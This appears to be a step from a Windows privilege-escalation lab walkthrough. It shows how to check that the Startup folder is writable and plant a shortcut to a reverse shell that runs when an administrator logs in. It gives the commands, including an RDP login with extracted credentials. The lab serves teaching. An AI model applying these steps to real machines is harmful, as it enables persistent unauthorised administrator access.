# 🐾 15. Autorun Programs

## 📜 Task Description
In this task, we will exploit a vulnerability in the Windows Startup folder to create a shortcut for a reverse shell, which will be executed when the administrator logs in. We will check that the `BUILTIN\Users` group has write permissions to the Startup directory, create a shortcut to our reverse shell, and wait for the administrator to log in.

---

## 🔍 Step 1: Check write permissions to the StartUp folder
Use the `accesschk.exe` tool to check that the `BUILTIN\Users` group has write permissions to the Startup folder:

'`C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`'

### 📋 Expected Output
- Ensure that the `BUILTIN\Users` group has write permissions to the StartUp folder.

## 🔑 Step 2: Create a shortcut to the reverse shell
Use the `cscript` utility to run the script `C:\PrivEsc\CreateShortcut.vbs`, which will create a shortcut to the executable `reverse.exe` in the StartUp folder:

'`cscript C:\PrivEsc\CreateShortcut.vbs`'

### 📋 Expected Output
- Ensure that the shortcut to the `reverse.exe` file has been successfully created in the StartUp folder.

## 📝 Step 3: Simulate the administrator's login
Start the listener on Kali, and then perform an RDP connection using the administrator credentials that were previously extracted:

'`xfreerdp /u:admin /p:password123 /cert:ignore /v:rhost`'

### 📋 Expected Output
- Ensure that after the administrator logs into the machine, the reverse shell with administrator privileges connects to your listener.
